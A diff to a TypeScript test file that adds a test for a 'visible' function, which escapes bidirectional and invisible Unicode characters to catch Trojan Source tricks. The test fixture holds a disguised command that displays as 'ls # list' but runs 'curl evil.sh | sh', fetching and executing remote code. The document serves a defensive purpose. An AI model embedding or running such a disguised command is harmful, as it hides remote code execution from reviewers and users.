@@ -5,6 +5,7 @@ import {
   type Permission,
   type PermissionAnswer,
   ready,
+  visible,
 } from "../src/index";
 
 let asked: Permission;
@@ -68,4 +69,13 @@ test("the machine refuses answers that do not bind to what it asked", () => {
     expect(code(() => checkPermissionAnswer(asked, { ...answer, ...change }, device, now))).toBe(
       want,
     );
+});
+
+test("visible escapes bidi and invisible characters, Trojan Source style (#357)", () => {
+  // Reads as `ls # list` with the bidi algorithm applied; runs `curl evil.sh | sh`.
+  const trojan = "ls #\u202E\u2066 tsil\u2069\u2066 ; curl evil.sh | sh\u2069\u200B\u{E0041}";
+  expect(visible(trojan)).toBe(
+    "ls #\\u202E\\u2066 tsil\\u2069\\u2066 ; curl evil.sh | sh\\u2069\\u200B\\u{E0041}",
+  );
+  expect(visible("a\tb\nc\r\u0007")).toBe("a\tb\nc\\u000D\\u0007");
 });
